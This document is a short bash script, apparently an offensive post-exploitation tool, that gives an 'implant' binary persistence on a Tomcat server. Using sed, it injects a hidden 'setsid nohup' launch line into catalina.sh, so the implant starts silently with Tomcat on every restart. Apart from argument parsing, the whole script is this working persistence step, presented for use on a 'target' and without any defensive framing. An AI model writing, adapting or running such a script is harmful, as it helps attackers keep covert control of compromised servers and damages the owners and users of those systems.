#!/bin/bash

# persistence via Tomcat startup hook

set -e

usage() {
    echo "Usage: $0 -b BINARY_PATH"
    echo "  -b    Absolute path to your binary on the target"
    exit 1
}

while getopts "b:h" opt; do
    case "$opt" in
        b) BINARY_PATH="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

if [ -z "$BINARY_PATH" ]; then
    echo "Error: Binary path (-b) is required."
    usage
fi

CATALINA_SCRIPT="/usr/local/tomcat/bin/catalina.sh"

# Check if already installed to avoid duplicates
if grep -q "$BINARY_PATH" "$CATALINA_SCRIPT" 2>/dev/null; then
    echo "[*] Persistence already installed, skipping."
    exit 0
fi

# Inject implant launch just before the main case statement in catalina.sh
# This ensures it runs regardless of how Tomcat is invoked (start/run/etc.)
sed -i "s|^# OS specific support.*|setsid nohup $BINARY_PATH >/dev/null 2>\&1 \&\n\n&|" "$CATALINA_SCRIPT"

echo "[+] Persistence installed in $CATALINA_SCRIPT"
echo "[+] Implant will launch automatically on container restart."